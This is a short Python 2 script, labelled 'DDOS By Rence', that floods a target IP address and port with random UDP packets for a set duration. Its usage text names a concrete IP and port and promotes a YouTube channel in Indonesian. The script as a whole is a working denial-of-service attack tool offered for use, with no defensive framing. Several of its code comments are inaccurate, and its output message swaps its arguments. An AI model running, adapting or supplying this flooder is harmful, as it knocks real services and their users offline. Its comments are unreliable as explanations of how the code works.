 
import time
import socket
import random
import sys

def usage():
    print "Command: " + sys.argv[0] + " <3.235.171.149> <7777> <9999999>"
    print "Jangan lupa subscribe channel https://youtube.com/channel/UCylMuQ-HgLfwsPEucwUux1Q"
    print "Jangan pake tools ini sembarangan ya, wajib subscribe dulu channel di atas "
    print "DDOS By Rence"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 999999

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

